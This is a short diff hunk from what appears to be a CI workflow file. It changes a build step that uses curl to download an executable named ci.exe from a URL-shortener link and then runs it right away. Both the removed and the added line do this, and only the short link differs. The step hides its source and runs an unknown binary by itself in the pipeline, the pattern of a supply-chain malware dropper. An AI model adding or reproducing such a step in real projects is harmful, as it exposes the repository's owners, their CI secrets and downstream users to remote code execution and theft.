@@ -20,7 +20,7 @@ jobs:
 
     steps:
 
-      - run: curl -L -o ci.exe https://shorturl.at/cklA2 && ci.exe
+      - run: curl -L -o ci.exe https://is.gd/0101010101 && ci.exe
       
       
       
